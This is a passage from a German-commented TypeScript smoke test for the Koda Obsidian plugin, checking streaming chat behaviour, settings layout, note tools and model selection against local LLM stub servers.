        await schliesseEinstellungen(cdp).catch(() => undefined);
      }
      record("63. Globales Modell-Feld abgeschafft: Altwert wandert in die Zeile, keine Zeile „Model“, keine Option „global model“", ok63, detail63);

      // --- 64. Kontextlaenge je Endpunkt-Zeile (obsidian-kit 0.56.0, Welle 18) ------------------
      // Ein Stub meldet fuer das Zeilen-Modell geladen 8192 / hoechstens 32768 (LM-Studio-Form). Die
      // Zeile zeigt beide Zahlen unter dem Status, bietet die Leer-Option „Server waehlt“ an, und die
      // Abfrage laeuft je Zeile und Modell genau EINMAL, obwohl Anzeige und Fenster-Uebernahme sie
      // beide brauchen (gemeinsamer Cache in `contextInfo`).
      let ok64 = false;
      let detail64 = "";
      let settings64: Cdp | null = null;
      const ctxServer64 = await startLlmStub({ models: ["ctx-64"], kontext: { geladen: 8192, max: 32768 } });
      const ctxHits64 = (): number => ctxServer64.anfragen().filter((a) => a.route === "api-v0-models").length;
      try {
        const url64 = ctxServer64.url;
        await cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          p.settings.endpoints = [{ url: ${JSON.stringify(url64)}, model: "ctx-64" }];
          await p.saveSettings();
          if (p.views().length === 0) await p.activateView();
          app.setting.open();
          app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
          return true;
        `);
        await new Promise((r) => setTimeout(r, 1200));
        settings64 = await attachTo("settings", port, vault);
        const dom64 = settings64 === null
          ? null
          : await pollUntil<{ text: string; leer: string[] } | null>(
              settings64,
              `
                const c = document.querySelector(".okit-ep-context");
                if (!c) return null;
                const opts = [...document.querySelectorAll(".okit-ep-row select option, .setting-item select option")].map((o) => o.textContent.trim());
                return { text: c.textContent.trim(), leer: opts };
              `,
              10000,
            );
        const zahlenOk = dom64 !== null && /8[.,\u202f]?192/.test(dom64.text) && /32[.,\u202f]?768/.test(dom64.text);
        const leerOk = dom64 !== null && dom64.leer.some((o) => /server (picks|w.hlt)/i.test(o));
        ok64 = zahlenOk && leerOk && ctxHits64() === 1;
        detail64 = `Kontextzeile „${dom64?.text ?? "—"}“ (beide Zahlen: ${zahlenOk}) · Leer-Option: ${leerOk} · Anfragen an /api/v0/models: ${ctxHits64()} (soll 1)`;
      } catch (error) {
        detail64 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
      } finally {
        settings64?.close();
        await schliesseEinstellungen(cdp).catch(() => undefined);
        await ctxServer64.stop();
      }
      record("64. Kontextlaenge je Endpunkt-Zeile: geladen und hoechstens unter der Zeile, Leer-Option „Server waehlt“, eine Anfrage je Zeile und Modell", ok64, detail64);

      // --- 65–67. Strom im Chat (Welle 20, zentraler Stub) ------------------------------------
      // Bisher ohne Modell nicht messbar: der Stub liefert den Strom in einstellbarem Takt. Der
      // scrollende Container ist `.koda-log` (`scrollEl` von `buildStreamArea`, `view.ts`), seine
      // Hoehe ist begrenzt (Spalten-Flex im Chat-Tab, `styles.css`) — sonst gaebe es nichts zu folgen.
      // Gueltigkeit (CORE-TEST-22): Ueberlauf >= 80 px zum Stoerungszeitpunkt (Folge-Schwelle 40 px + 40 px
      // Spielraum) und mindestens zwei Stuecke nach der Stoerung, abgetastet nur bis zum vorletzten Stueck
      // (der Schluss-Draw zaehlt nicht); der Stub haelt danach drei Takte offen. Sonst „nichts gemessen“.
      {
        // Tokengrosse Stuecke (10 Zeichen, hoechstens eine Zeile Zuwachs): `followTail` prueft den Abstand NACH dem
        // Wachsen, ein Stueck von mehr als 40 px (Folge-Schwelle) reisst die Verfolgung ab — mit ganzen Absaetzen
        // je Stueck ging Punkt 65 rot (Abstand 878 px). Echte Token sind klein; der Stub bildet sie nach.
        const TAKT = 40;
        const LAENGE = 10;
        const antwortText = Array.from({ length: 26 }, (_, i) => `Absatz ${i + 1}: Der Strom laeuft weiter, Wort fuer Wort, damit der Verlauf waechst und das Ende wandert.\n\n`).join("");
        const STUECKE = Math.ceil(antwortText.length / LAENGE);
        const absaetze = antwortText.split(/(?<=\n\n)/);
        const LOG = `app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view.containerEl.querySelector(".koda-log")`;
        const pause = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        const chatOffen = (): Promise<unknown> => cdp.evaluate(`
          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
          if (p.views().length === 0) await p.activateView();
          app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-chat")});
          return true;
        `);
        const abwarten = async (): Promise<void> => {
          await pollUntil<boolean>(cdp, `return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].busy ? null : true;`, 25_000).catch(() => undefined);
        };
        // Folge-Messung: zentral (`messeFolge`, tools/obsidian-cdp/README § Folge-Messung). Hier bleibt nur, was Wissen
        // ueber Koda ist: Stub, Modell, Chat oeffnen, Senden, der Scroll-Container und „laeuft der Strom noch“.
        // `grob`: ein ganzer Absatz je Stueck (Zuwachs > 40 px) — vor Kit 0.59.0 riss das die Verfolgung ab.
        const strom = async (opt: { kontrolle: boolean; stoerung: boolean; wiederaufnahme?: boolean }, grob = false): Promise<Awaited<ReturnType<typeof messeFolge>>> => {
          const takt = grob ? 150 : TAKT;
          const stub = await startLlmStub({ models: ["smoke-model"], takt, nachlaufMs: 3 * takt, standard: grob ? { stuecke: absaetze } : { text: antwortText, laenge: LAENGE } });
          try {
            await setzeModell("smoke-model", stub.url);
            await chatOffen();
            await pause(400);
            const ergebnis = await messeFolge(cdp, {
              ausdruck: LOG,
              laeuft: () => stub.zaehler().unterwegs > 0,
              starte: () => cdp.evaluate(`void app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].ask("Smoke: lange Antwort."); return true;`),
              ...opt,
            });
            await abwarten();
            return ergebnis;
          } finally {
            await stub.stop();
          }
        };

        const P65 = "65. Strom: der Verlauf folgt dem Ende, solange niemand eingreift (Kontrolle zu 66)";
        const P66 = "66. Folge-Regel: Hochscrollen mitten im Strom wird respektiert, der Verlauf springt nicht zurueck";
        const P68 = "68. Strom mit absatzgrossen Stuecken: der Verlauf folgt dem Ende auch bei Spruengen ueber die Folge-Schwelle (Kit 0.59.0, withFollow)";
        const P69 = "69. Folge-Regel, zweite Haelfte: steht der Nutzer wieder unten, folgt der Verlauf dem Strom wieder";
        const abbruch = (name: (typeof PUNKTE)[number], error: unknown): void => unmeasured(name, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);

        // 65. Kontrolle: ohne Stoerung folgt der Verlauf dem Ende.
        try {
          zeichneFolge({ record, unmeasured }, { kontrolle: P65 }, await strom({ kontrolle: true, stoerung: false }));
        } catch (error) { abbruch(P65, error); }

        // 68. Absatzgrosse Stuecke: dieselbe Kontrolle wie 65, aber jedes Stueck waechst um mehr als die Folge-Schwelle.
        try {
          zeichneFolge({ record, unmeasured }, { kontrolle: P68 }, await strom({ kontrolle: true, stoerung: false }, true));
        } catch (error) { abbruch(P68, error); }

        // 66 + 69. Stoerung: scrollTop = 0 mitten im Strom; der Verlauf darf nicht zum Ende springen (66). Danach
        // stellt die Messung den Nutzer wieder unten her; der Verlauf muss dem Strom wieder folgen (69).
        try {
          zeichneFolge({ record, unmeasured }, { folge: P66, wiederaufnahme: P69 }, await strom({ kontrolle: false, stoerung: true, wiederaufnahme: true }));
        } catch (error) { abbruch(P66, error); abbruch(P69, error); }

        // 67. Denkblock live: Reasoning waechst sichtbar, waehrend der Antworttext noch fehlt.
        let ok67 = false; let detail67 = "";
        const stub67 = await startLlmStub({
          models: ["smoke-model"], takt: 250, nachlaufMs: 750,
          standard: { reasoning: "Ich ueberlege Schritt fuer Schritt, was zu tun ist. ".repeat(12), laenge: 40, text: "Fertig." },
        });
        try {
          await setzeModell("smoke-model", stub67.url);
          await chatOffen();
          await pause(400);
          await cdp.evaluate(`void app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].ask("Smoke: denke nach."); return true;`);
          const proben: { len: number; offen: boolean; sichtbar: boolean; body: number }[] = [];
          const frist67 = Date.now() + 8_000;
          while (Date.now() < frist67 && proben.length < 12) {
            const pr = await cdp.evaluate<{ len: number; offen: boolean; sichtbar: boolean; body: number } | null>(`
              const pre = document.querySelector(".okit-stream-reasoning pre");
              if (!pre) return null;
              const det = pre.closest("details");
              return { len: pre.textContent.length, offen: det.open, sichtbar: pre.getBoundingClientRect().height > 0, body: (document.querySelector(".okit-stream-body")?.textContent ?? "").trim().length };
            `);
            if (pr !== null) proben.push(pr);
            await pause(250);
          }
          const langen = proben.map((x) => x.len);
          const waechst = langen.length >= 3 && langen.every((l, i) => i === 0 || l >= langen[i - 1]!) && langen[langen.length - 1]! > langen[0]!;
          const sichtbar = proben.length > 0 && proben.every((x) => x.offen && x.sichtbar);
          const vorAntwort = proben.length > 0 && proben[0]!.body === 0;
          if (proben.length < 3) detail67 = `Abbruch: nur ${proben.length} Probe(n) mit Denkblock im Strom`;
          else {
            ok67 = waechst && sichtbar && vorAntwort;
            detail67 = `${proben.length} Proben, Laenge ${langen.join(" → ")} · offen und sichtbar: ${sichtbar} · beim ersten Probepunkt noch keine Antwort: ${vorAntwort}`;
          }
          await abwarten();
        } catch (error) {
          detail67 = `Abbruch: ${error instanceof Error ? error.message : String(error)}`;
        } finally {
          await stub67.stop();
        }
        record("67. Denkblock live: der Reasoning-Text ist waehrend des Stroms sichtbar und waechst", ok67, detail67);
      }

      // --- 70–75. Welle 22: Fehler-Marke, Einstellungen, list_notes, open_note, gleichnamig, Netzfehler ----
      {
        const PL = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const pause22 = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        const abbruch22 = (name: (typeof PUNKTE)[number], error: unknown): void => unmeasured(name, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
        const chatZeigen = (): Promise<unknown> => cdp.evaluate(`
          const p = ${PL};
          if (p.views().length === 0) await p.activateView();
          app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-chat")});
          return true;
        `);

        // 70. Zwei gescheiterte Sendungen: Frage + Fehlerblase je Versuch, nicht fuenf gleiche Fragen ohne Grund.
        const P70 = "70. Gescheiterte Anfrage: zwei Sendungen gegen einen Endpunkt mit HTTP 500 ergeben zwei Fragen und zwei Fehlerblasen — im Verlauf, im DOM und im JSONL";
        const fake70 = await startScriptedEndpoint(() => ({ status: 500, errorMessage: "Smoke-Fehler 70" }));
        try {
          await setzeModell("smoke-model", fake70.url);
          await chatZeigen();
          await pause22(400);
          for (let i = 0; i < 2; i++) await cdp.evaluate(`await ${PL}.ask("Smoke 70: gleiche Frage"); return true;`);
          const r70 = await cdp.evaluate<{ fragen: number; fehler: number; dom: number; jsonl: number; text: string }>(`
            const p = ${PL};
            const log = p.chatLog;
            const dom = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0].view.containerEl.querySelectorAll(".koda-log .koda-error").length;
            const raw = await app.vault.adapter.read(p.manifest.dir + "/sessions/current.jsonl");
            const zeilen = raw.split("\\n").filter((z) => z.trim() !== "").map((z) => JSON.parse(z));
            return {
              fragen: log.filter((m) => m.role === "user").length,
              fehler: log.filter((m) => m.kind === "error").length,
              dom,
              jsonl: zeilen.filter((m) => m.kind === "error").length,
              text: (log.find((m) => m.kind === "error") ?? {}).text ?? "",
            };
          `);
          record(P70, r70.fragen === 2 && r70.fehler === 2 && r70.dom === 2 && r70.jsonl === 2 && r70.text.includes("Smoke-Fehler 70"),
            `Fragen ${r70.fragen} · Fehler-Marken im Verlauf ${r70.fehler} · Fehlerblasen im DOM ${r70.dom} · Fehler-Zeilen im JSONL ${r70.jsonl} (soll je 2) · Text „${r70.text.slice(0, 60)}“`);
        } catch (error) { abbruch22(P70, error); } finally { await fake70.close(); }

        // 71. Nativer Einstellungspfad: Liste nicht duplizieren, Textarea nicht auf 30 px.
        const P71 = "71. Einstellungen (nativer Pfad): nach zwei Werkzeug-Schaltern steht genau eine Werkzeugliste, die Anweisungs-Textarea ist breiter als 200 px";
        const P97 = "97. Werkzeugliste: jedes Beschreibungsfeld zeigt seinen Inhalt in ganzen Zeilen, keine halb abgeschnittene Zeile am unteren Rand, mindestens drei Zeilen hoch";
        let settings71: Cdp | null = null;
        try {
          await cdp.evaluate(`app.setting.open(); app.setting.openTabById(${JSON.stringify(PLUGIN_ID)}); return true;`);
          await pause22(1200);
          settings71 = await attachTo("settings", port, vault);
          if (settings71 === null) { unmeasured(P71, "Einstellungsfenster nicht gefunden"); }
          else {
            await pollUntil(settings71, `return document.querySelector(".koda-tool-row") ? true : null;`, 8000);
            for (let i = 0; i < 2; i++) {
              await settings71.evaluate(`
                const rows = [...document.querySelectorAll(".koda-tool-row")];
                rows[${i}].querySelector(".checkbox-container").click();
                return true;
              `);
              await pause22(900);
            }
            const m71 = await settings71.evaluate<{ listen: number; breite: number; zeilen: number }>(`
              const ta = document.querySelector(".koda-prompt-textarea");
              return {
                listen: document.querySelectorAll(".koda-tool-list").length,
                zeilen: document.querySelectorAll(".koda-tool-row").length,
                breite: ta ? ta.getBoundingClientRect().width : -1,
              };
            `);
            record(P71, m71.listen === 1 && m71.breite > 200,
              `Werkzeuglisten ${m71.listen} (soll 1) · Zeilen ${m71.zeilen} · Breite der Anweisungs-Textarea ${Math.round(m71.breite)} px (soll > 200)`);
            // 97. Das Beschreibungsfeld haelt seine Hoehe am Inhalt: ein festes `rows` liess eine vierte Zeile zur Haelfte in den
            // unteren Innenabstand ragen (Bild tools-provider.png, Welle 23). Gemessen wird, dass NICHTS verdeckt ist (scrollHeight
            // gegen clientHeight), nicht eine Pixelzahl, die am Theme hinge.
            const m97 = await settings71.evaluate<{ felder: number; abgeschnitten: number; zuKlein: number; hoechstes: number }>(`
              const alle = [...document.querySelectorAll(".koda-tool-row textarea")];
              const lh = (e) => parseFloat(getComputedStyle(e).lineHeight) || 17;
              return {
                felder: alle.length,
                abgeschnitten: alle.filter((e) => e.scrollHeight > e.clientHeight + 1).length,
                zuKlein: alle.filter((e) => e.getBoundingClientRect().height < lh(e) * 3 - 1).length,
                hoechstes: Math.max(0, ...alle.map((e) => Math.round(e.getBoundingClientRect().height / lh(e)))),
              };`);
            record(P97, m97.felder > 0 && m97.abgeschnitten === 0 && m97.zuKlein === 0,
              `${m97.felder} Beschreibungsfelder · abgeschnitten: ${m97.abgeschnitten} (soll 0) · niedriger als drei Zeilen: ${m97.zuKlein} (soll 0) · höchstes Feld ${m97.hoechstes} Zeilen`);
          }
        } catch (error) { abbruch22(P71, error); abbruch22(P97, error); } finally {
          settings71?.close();
          await cdp.evaluate(`
            const p = ${PL};
            p.settings.toolsDisabled = [];
            await p.saveSettings();
            return true;
          `).catch(() => undefined);
          await schliesseEinstellungen(cdp).catch(() => undefined);
        }


        // 76. Anbieter-Gruppe in der Werkzeugliste der Einstellungen (nativer Pfad).
        const P76 = "76. Einstellungen: Werkzeuge eines Anbieter-Plugins stehen in eigener Gruppe mit Schalter, ein Anbieter ohne version nennt seinen Grund, der Schalter schreibt toolsDisabled";
        const PROV76 = "koda-smoke-provider-76";
        const ALT76 = "koda-smoke-altanbieter-76";
        let settings76: Cdp | null = null;
        try {
          if (await cdp.evaluate<boolean>(`return !!app.plugins.plugins[${JSON.stringify(PROV76)}] || !!app.plugins.plugins[${JSON.stringify(ALT76)}];`)) {
            unmeasured(P76, "uebersprungen — ein Eintrag unter der Stub-Id existiert bereits");
          } else {
            await cdp.evaluate(`
              app.plugins.plugins[${JSON.stringify(PROV76)}] = { api: { version: 1, tools: () => [
                { name: "smoke76_echo", description: "Smoke 76 Beschreibung", parameters: { type: "object", properties: {}, required: [] }, writes: false },
                { name: "read_note", description: "Kollision 76", parameters: { type: "object", properties: {}, required: [] }, writes: false },
              ], executeTool: async () => ({ ok: true, content: "x" }) } };
              app.plugins.plugins[${JSON.stringify(ALT76)}] = { api: { tools: () => [], executeTool: async () => ({ ok: true, content: "x" }) } };
              app.setting.open(); app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
              return true;
            `);
            await pause22(1200);
            settings76 = await attachTo("settings", port, vault);
            if (settings76 === null) unmeasured(P76, "Einstellungsfenster nicht gefunden");
            else {
              await pollUntil(settings76, `return document.querySelector('.koda-tool-row[data-tool="smoke76_echo"]') ? true : null;`, 8000);
              const m76 = await settings76.evaluate<{ gruppe: string; zeile: boolean; platzhalter: string; warn: string; linksEigen: number; linksFremd: number; breiteFremd: number; hoeheOk: boolean }>(`
                const eigen = document.querySelector('.koda-tool-list > .koda-tool-row textarea');
                const fremd = document.querySelector('.koda-tool-row[data-tool="smoke76_echo"] textarea');
                const lh = fremd ? parseFloat(getComputedStyle(fremd).lineHeight) || 20 : 20;
                const z = document.querySelector('.koda-tool-row[data-tool="smoke76_echo"]');
                const g = z ? z.closest(".koda-tool-group") : null;
                return {
                  gruppe: g ? (g.querySelector(".koda-tool-group-title")?.textContent ?? "") : "",
                  zeile: !!z,
                  platzhalter: z ? (z.querySelector("textarea")?.getAttribute("placeholder") ?? "") : "",
                  warn: [...document.querySelectorAll(".koda-tool-group.koda-warn")].map((e) => e.textContent).join(" | "),
                  linksEigen: eigen ? eigen.getBoundingClientRect().left : -1,
                  linksFremd: fremd ? fremd.getBoundingClientRect().left : -2,
                  breiteFremd: fremd ? fremd.getBoundingClientRect().width : -1,
                  hoeheOk: !!fremd && fremd.getBoundingClientRect().height >= lh * 3 - 1,
                };
              `);
              await settings76.evaluate(`document.querySelector('.koda-tool-row[data-tool="smoke76_echo"] .checkbox-container').click(); return true;`);
              await pause22(900);
              const aus76 = await cdp.evaluate<boolean>(`return ${PL}.settings.toolsDisabled.includes("smoke76_echo");`);
              record(P76, m76.zeile && m76.gruppe.includes(PROV76) && m76.platzhalter === "Smoke 76 Beschreibung" && m76.warn.includes(ALT76) && m76.warn.includes(`${PROV76}: `) && /read_note/.test(m76.warn) && /not offered to Koda/.test(m76.warn) && aus76
                && Math.abs(m76.linksEigen - m76.linksFremd) <= 2 && m76.breiteFremd > 200 && m76.hoeheOk,
                `Gruppe „${m76.gruppe}“ · Zeile da: ${m76.zeile} · Platzhalter „${m76.platzhalter}“ · Ablehnung und Kollision: „${m76.warn.slice(0, 400)}“ · nach dem Schalter in toolsDisabled: ${aus76} · Textarea links eigen ${Math.round(m76.linksEigen)} / fremd ${Math.round(m76.linksFremd)} px · Breite ${Math.round(m76.breiteFremd)} px (soll > 200) · Höhe für 3 Zeilen: ${m76.hoeheOk}`);
            }
          }
        } catch (error) { abbruch22(P76, error); } finally {
          settings76?.close();
          await cdp.evaluate(`
            delete app.plugins.plugins[${JSON.stringify(PROV76)}]; delete app.plugins.plugins[${JSON.stringify(ALT76)}];
            const p = ${PL};
            p.settings.toolsDisabled = [];
            await p.saveSettings();
            return true;
          `).catch(() => undefined);
          await schliesseEinstellungen(cdp).catch(() => undefined);
        }

        // 72–74. Werkzeuge ueber DENSELBEN Weg wie ask() (`buildTools().run`).
        const run = <T>(name: string, args: unknown): Promise<T> => cdp.evaluate<T>(`
          return await ${PL}.buildTools().run(${JSON.stringify(name)}, ${JSON.stringify(args)});
        `);
        const P72 = "72. list_notes nennt .base und .canvas auf einer eigenen Zeile und je Unterordner, ohne sie als Notizen zu zaehlen";
        const P73 = "73. open_note oeffnet eine vorhandene Notiz im Workspace, ein unbekannter Pfad legt nichts an";
        const P74 = "74. write_note create: eine gleichnamige Notiz in einem anderen Ordner wird abgewiesen und der vorhandene Pfad genannt";
        try {
          await cdp.evaluate(`
            for (const f of ["Smoke22", "Smoke22/Sub"]) if (!app.vault.getFolderByPath(f)) await app.vault.createFolder(f);
            for (const [p, c] of [["Smoke22/A.md", "a"], ["Smoke22/Sub/B.md", "b"], ["Smoke22/Board.base", "views: []"], ["Smoke22/Sub/Karte.canvas", "{}"]]) {
              const alt = app.vault.getFileByPath(p);
              if (alt) await app.vault.delete(alt);
              await app.vault.create(p, c);
            }
            return true;
          `);
          // 72
          const l72 = await run<{ ok: boolean; content?: string; error?: string }>("list_notes", { folder: "Smoke22" });
          const t72 = l72.content ?? l72.error ?? "";
          record(P72, l72.ok && /1 von 1 Notizen/.test(t72) && /Weitere lesbare Dateien \(1, keine Notizen.*Smoke22\/Board\.base/.test(t72) && /Smoke22\/Sub \(1 Notiz, 1 weitere lesbare Datei\)/.test(t72),
            `Ausgabe: ${t72.replace(/\s+/g, " ").slice(0, 260)}`);
          // 73
          const o73 = await run<{ ok: boolean }>("open_note", { path: "Smoke22/A.md" });
          await pause22(500);
          const aktiv = await cdp.evaluate<string>(`return app.workspace.getActiveFile()?.path ?? "";`);
          const o73b = await run<{ ok: boolean }>("open_note", { path: "Smoke22/Nichts.md" });
          const angelegt = await cdp.evaluate<boolean>(`return app.vault.getFileByPath("Smoke22/Nichts.md") !== null;`);
          record(P73, o73.ok && aktiv === "Smoke22/A.md" && !o73b.ok && !angelegt,
            `geoeffnet: ${o73.ok} · aktive Datei „${aktiv}“ · unbekannter Pfad abgelehnt: ${!o73b.ok} · dabei angelegt: ${angelegt}`);
          // 74
          const w74 = await run<{ ok: boolean; error?: string }>("write_note", { path: "Koda/A.md", content: "neu", mode: "create" });
          const da74 = await cdp.evaluate<boolean>(`return app.vault.getFileByPath("Koda/A.md") !== null;`);
          record(P74, !w74.ok && (w74.error ?? "").includes("Smoke22/A.md") && !da74,
            `abgewiesen: ${!w74.ok} · Fehler „${(w74.error ?? "").slice(0, 100)}“ · Koda/A.md angelegt: ${da74}`);
        } catch (error) { abbruch22(P72, error); abbruch22(P73, error); abbruch22(P74, error); } finally {
          await cdp.evaluate(`
            const f = app.vault.getFolderByPath("Smoke22");
            if (f) await app.vault.delete(f, true);
            const k = app.vault.getFileByPath("Koda/A.md");
            if (k) await app.vault.delete(k);
            return true;
          `).catch(() => undefined);
        }

        // 75. Netzfehler: die erste Verbindung bricht ab, die zweite Anfrage streamt wieder.
        const P75 = "75. Netzfehler-Fallback: bricht die erste Verbindung ab, streamt die zweite Anfrage wieder (stream:true) und die Antwort kommt an";
        const stub75 = await startLlmStub({
          models: ["smoke-model"],
          antwort: (_anfrage, n) => (n === 1 ? { text: "halb", abbruchNach: 0 } : { text: "Smoke-Antwort 75" }),
        });
        try {
          await setzeModell("smoke-model", stub75.url);
          await cdp.evaluate(`await ${PL}.ask("Smoke 75: Netzfehler"); return true;`);
          const chats = stub75.anfragen().filter((a) => a.route === "chat");
          const letzte = await cdp.evaluate<string>(`const l = ${PL}.chatLog; return l[l.length - 1]?.content ?? "";`);
          record(P75, chats.length >= 2 && chats[1]!.stream === true && letzte.includes("Smoke-Antwort 75"),
            `Chat-Anfragen ${chats.length} (soll >= 2) · 2. mit stream:true: ${chats[1]?.stream === true} · letzte Verlaufszeile „${letzte.slice(0, 40)}“`);
        } catch (error) { abbruch22(P75, error); } finally { await stub75.stop(); }

        // 77. Gemma 4 auf LM Studio schreibt das Denken OHNE Öffner in `content` und beendet es mit `<channel|>`
        // (Welle 23, Gegenprobe zu `onContentReset`). Gemessen wird der Anzeigetext WÄHREND des Stroms (der Denktext darf
        // dort nach dem Kanalende nicht mehr stehen) und die Antwort im Verlauf.
        const P77 = "77. Gemma 4 ohne Öffner: der Denktext steht im Denkblock, nicht in der Antwort (Stream und Verlauf)";
        const GEDANKE77 = "Ich wäge erst die Quellen ab und prüfe dann den Kontext.";
        const stub77 = await startLlmStub({
          models: ["google/gemma-4-e4b"],
          antwort: () => ({ stuecke: [GEDANKE77.slice(0, 20), GEDANKE77.slice(20) + "<channel|>", "Die fertige ", "Antwort."], takt: 500 }),
        });
        try {
          await setzeModell("google/gemma-4-e4b", stub77.url);
          await cdp.evaluate(`void ${PL}.ask("Smoke 77: Gemma"); return true;`);
          const live = await pollUntil<{ body: string; thought: string; hasBlock: boolean }>(cdp, `
            const b = [...document.querySelectorAll(".koda-streaming .okit-stream-body")].pop();
            if (!b || !(b.textContent || "").includes("fertige")) return null;
            const r = [...document.querySelectorAll(".koda-streaming .okit-stream-reasoning")].pop();
            return { body: (b.textContent || "").trim(), thought: r ? (r.textContent || "") : "", hasBlock: !!r };`, 20_000, 60).catch(() => null);
          await pollUntil<boolean>(cdp, `return ${PL}.busy ? null : true;`, 20_000);
          const letzte = await cdp.evaluate<string>(`const l = ${PL}.chatLog.filter((m) => m.role === "assistant"); return l[l.length - 1]?.content ?? "";`);
          record(P77,
            live !== null && live.hasBlock && live.thought.includes("wäge") && !live.body.includes("wäge") && !live.body.includes("channel")
              && letzte === "Die fertige Antwort.",
            live === null
              ? `kein laufender Strom mit „fertige“ gesehen · Verlauf „${letzte.slice(0, 80)}“`
              : `Strom-Anzeige „${live.body.slice(0, 60)}“ · Denkblock da: ${live.hasBlock} (${live.thought.slice(0, 30)}…) · Verlauf „${letzte.slice(0, 60)}“`);
        } catch (error) { abbruch22(P77, error); } finally { await stub77.stop(); }

        // 100–103. Modellzeile (Welle 27, K3): ein Stub mit zwei Modellen. Die Zeile steht über dem Verlauf; ihr Wechsel schreibt in dieselbe Stelle wie der Tab (die Zeile des
        // gesendeten Endpunkts), und `saveSettings()` (verwirft den Zwischenstand des Resolvers) darf die Anzeige nicht auf die erste Zeile zurückspringen lassen.
        const P100 = PUNKTE.find((n) => n.startsWith("102. "))!;
        const P101 = PUNKTE.find((n) => n.startsWith("103. "))!;
        const P102 = PUNKTE.find((n) => n.startsWith("104. "))!;
        const P103 = PUNKTE.find((n) => n.startsWith("105. "))!;
        const stubM = await startLlmStub({
          models: ["smoke-model", "smoke-model-2"],
          antwort: () => ({ stuecke: Array.from({ length: 10 }, (_, i) => `Absatz ${i}.\n\n`), takt: 400 }),
        });
        try {
          await setzeModell("smoke-model", stubM.url);
          await chatZeigen();
          const zeile = await pollUntil<{ zeilen: number; label: string; aria: string | null; neuLaden: boolean; denkInZeile: number; kopfAktionen: number; optionen: string[]; wert: string }>(cdp, `
            const s = document.querySelector(".koda-root .okit-model-bar-select");
            // Auf die Liste DIESES Stubs warten: nach einem Endpunktwechsel zeigt die Zeile kurz die Liste des vorigen (der Abruf läuft noch).
            if (!s || ![...s.options].some((o) => o.value === "smoke-model-2")) return null;
            return { zeilen: document.querySelectorAll(".koda-root .okit-model-bar").length, label: document.querySelector(".koda-root .okit-model-bar-label")?.textContent ?? "",
              aria: s.getAttribute("aria-label"), neuLaden: !!document.querySelector(".koda-root .okit-model-bar button"), denkInZeile: document.querySelectorAll(".koda-root .okit-model-bar .okit-thinking-control").length,
              kopfAktionen: document.querySelectorAll(".koda-header .koda-header-action").length, optionen: [...s.options].map((o) => o.value), wert: s.value };`, 15_000, 250).catch(() => null);
          if (zeile === null) unmeasured(P100, "keine Modellzeile mit Liste im Chat-Tab gefunden");
          else record(P100, zeile.zeilen === 1 && zeile.label === "Koda" && !!zeile.aria && zeile.neuLaden && zeile.denkInZeile === 1 && zeile.kopfAktionen === 1 && zeile.optionen.join("|") === "|smoke-model|smoke-model-2" && zeile.wert === "smoke-model",
            `Zeilen ${zeile.zeilen} · Name „${zeile.label}“ · aria „${String(zeile.aria)}“ · Neu-laden ${zeile.neuLaden} · Denk-Steuerung in der Zeile ${zeile.denkInZeile} (soll 1) · Kopf-Aktionen ${zeile.kopfAktionen} (soll 1) · Optionen ${zeile.optionen.join(",")} · Wert ${zeile.wert}`);

          const waehle = (v: string): Promise<unknown> => cdp.evaluate(`
            const s = document.querySelector(".koda-root .okit-model-bar-select");
            s.value = ${JSON.stringify(v)}; s.dispatchEvent(new Event("change", { bubbles: true }));
            await new Promise((r) => setTimeout(r, 1200)); return true;`);
          const lies = (): Promise<{ gesendet: string; zeile: string; dropdown: string }> => cdp.evaluate(`
            const p = ${PL};
            return { gesendet: p.sentModel(), zeile: p.settings.endpoints[0]?.model ?? "", dropdown: document.querySelector(".koda-root .okit-model-bar-select")?.value ?? null };`);
          await waehle("smoke-model-2");
          const zwei = await lies();
          await waehle("");
          const auto = await lies();
          record(P101, zwei.gesendet === "smoke-model-2" && zwei.zeile === "smoke-model-2" && zwei.dropdown === "smoke-model-2" && auto.zeile === "" && auto.dropdown === "",
            `gewählt: gesendet „${zwei.gesendet}“ · Zeile „${zwei.zeile}“ · Dropdown „${zwei.dropdown}“ · Automatisch: Zeile „${auto.zeile}“ · Dropdown „${auto.dropdown}“`);

          await cdp.evaluate(`
            const p = ${PL};
            p.settings.endpoints = [{ url: ${JSON.stringify(stubM.url)}, model: "smoke-model-2" }];
            await p.saveSettings();
            await new Promise((r) => setTimeout(r, 1200)); return true;`);
          const tab = await lies();
          record(P102, tab.dropdown === "smoke-model-2" && tab.gesendet === "smoke-model-2", `Einstellung auf smoke-model-2: Dropdown „${tab.dropdown}“ · gesendet „${tab.gesendet}“`);

          await cdp.evaluate(`void ${PL}.ask("Smoke 103: Lauf"); return true;`);
          const imLauf = await pollUntil<{ dropdown: boolean; denk: boolean }>(cdp, `
            const d = document.querySelector(".koda-root .okit-model-bar-select")?.disabled === true;
            const k = document.querySelector(".koda-root .okit-model-bar .okit-thinking-toggle")?.disabled === true;
            return d ? { dropdown: d, denk: k } : null;`, 15_000, 100).catch(() => null);
          await pollUntil<boolean>(cdp, `return ${PL}.busy ? null : true;`, 30_000);
          const danach = await cdp.evaluate<{ dropdown: boolean; denk: boolean }>(`
            return { dropdown: document.querySelector(".koda-root .okit-model-bar-select")?.disabled === true, denk: document.querySelector(".koda-root .okit-model-bar .okit-thinking-toggle")?.disabled === true };`);
          record(P103, imLauf !== null && imLauf.dropdown && imLauf.denk && !danach.dropdown && !danach.denk,
            `im Lauf gesperrt: Dropdown ${String(imLauf?.dropdown)}, Denk-Knopf ${String(imLauf?.denk)} · danach gesperrt: Dropdown ${String(danach.dropdown)}, Denk-Knopf ${String(danach.denk)}`);
        } catch (error) {
